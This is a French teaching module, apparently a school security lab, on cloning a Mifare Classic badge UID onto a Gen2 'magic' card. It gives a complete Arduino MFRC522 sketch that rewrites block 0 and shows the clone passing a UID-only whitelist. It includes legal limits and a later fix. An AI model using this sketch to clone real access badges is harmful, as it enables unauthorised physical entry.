Cours

1. Principe du clonage d'UID

Sur une carte Mifare Classic d'origine, le bloc 0 (contenant l'UID) est en lecture seule, protégé au niveau matériel. Des cartes dites « magiques » (Gen1A, Gen2/CUID) lèvent cette protection et permettent de réécrire ce bloc directement — c'est ce qui rend le clonage d'UID possible sans attaque cryptographique.

2. Cadre légal

L'accès ou le maintien frauduleux dans un STAD (article 323-1 du Code pénal) est une infraction. Toute manipulation de clonage dans ce module reste strictement limitée au badge et à la carte de la mallette, dans un cadre pédagogique encadré et consenti.

Badges d'accès réels (enseignant ou élèves) : exclus de cet atelier. Même observés en séance 1, ils ne sont jamais clonés ici. Cloner un badge qui donne un accès réel au bâtiment, même « pour apprendre », crée un véritable moyen d'entrée non autorisé — pas une simulation.

Atelier

Objectif : cloner l'UID du badge de la mallette, puis vérifier s'il passe le contrôle d'accès par liste blanche construit en séance 4.

Étape 1 : identifier le support disponible

Si une carte magique (Gen1A ou Gen2/CUID) est fournie, elle se reconnaît généralement à son UID par défaut (souvent 00 00 00 00) ou à une mention du vendeur. Si aucune carte magique n'est disponible, passez en simulation : commentez les lignes d'écriture du sketch ci-dessous et contentez-vous d'observer le code et son fonctionnement théorique.

Étape 2 : relever l'UID cible

Relisez l'UID du badge de la mallette avec le sketch de la séance 4 (ReadUID) et notez-le précisément.

Étape 3 : écrire l'UID sur la carte magique (Gen2/CUID)

Les cartes Gen2 acceptent une écriture directe du bloc 0 avec la clé par défaut, sans commande spéciale :

#include <SPI.h>
#include <MFRC522.h>

#define SS_PIN 10
#define RST_PIN 9
MFRC522 rfid(SS_PIN, RST_PIN);
MFRC522::MIFARE_Key key;

// UID cible : remplacez par celui relevé à l'étape 2
byte nouvelUID[4] = {0x09, 0x74, 0x2E, 0xA7};

void setup() {
  Serial.begin(9600);
  SPI.begin();
  rfid.PCD_Init();
  for (byte i = 0; i < 6; i++) key.keyByte[i] = 0xFF;
}

void loop() {
  if (!rfid.PICC_IsNewCardPresent() || !rfid.PICC_ReadCardSerial()) return;

  byte bloc0[16] = {0};
  memcpy(bloc0, nouvelUID, 4);
  bloc0[4] = nouvelUID[0] ^ nouvelUID[1] ^ nouvelUID[2] ^ nouvelUID[3]; // BCC
  bloc0[5] = 0x08; bloc0[6] = 0x04; bloc0[7] = 0x00; // SAK/ATQA typiques 1K
  bloc0[8] = 0x01; bloc0[9] = 0xC3; bloc0[10] = 0x50; bloc0[11] = 0xD4; // octets fabricant (exemple)

  MFRC522::StatusCode status = rfid.PCD_Authenticate(
    MFRC522::PICC_CMD_MF_AUTH_KEY_A, 0, &key, &(rfid.uid));
  if (status == MFRC522::STATUS_OK) {
    status = rfid.MIFARE_Write(0, bloc0, 16); // écriture directe, spécifique aux cartes Gen2
    Serial.println(status == MFRC522::STATUS_OK ? F("Clone écrit avec succès") : F("Échec d'écriture"));
  }
  rfid.PICC_HaltA();
  rfid.PCD_StopCrypto1();
}
✓ Résultat attendu : « Clone écrit avec succès » dans le moniteur série.

Étape 4 : vérifier le clone

Relancez DumpInfo (séance 5) sur la carte magique : l'UID affiché doit maintenant être identique à celui du badge d'origine.

Étape 5 : tester contre la liste blanche de la séance 4

Rechargez le sketch de liste blanche (séance 4), présentez la carte clonée.

✓ Résultat attendu, et c'est le cœur de la démonstration : « ACCÈS AUTORISÉ » et la LED verte s'allument — le clone passe exactement comme l'original, car le système ne vérifie que l'UID.

Dépannage

  • Échec d'écriture du bloc 0 : la carte n'est probablement pas une Gen2/CUID — toutes les cartes « magiques » ne fonctionnent pas de la même façon.
  • Le clone ne passe pas la liste blanche : vérifiez que l'UID écrit correspond exactement, octet par octet, à celui attendu par le sketch de séance 4.

Débrief

Répondez par écrit, en 2 à 3 phrases chacune :

  1. Pourquoi le clone a-t-il réussi à tromper le système de la séance 4 ?
  2. Qu'est-ce que cette attaque ne permet pas de faire (quelles limites le clonage d'UID seul a-t-il) ?
  3. Vous commencerez à corriger cette faille dès la séance 7.
Livrable : compte-rendu de l'attaque (ou de son analyse en simulation), capture du clone passant la liste blanche, réponses au débrief, limites légales rencontrées.
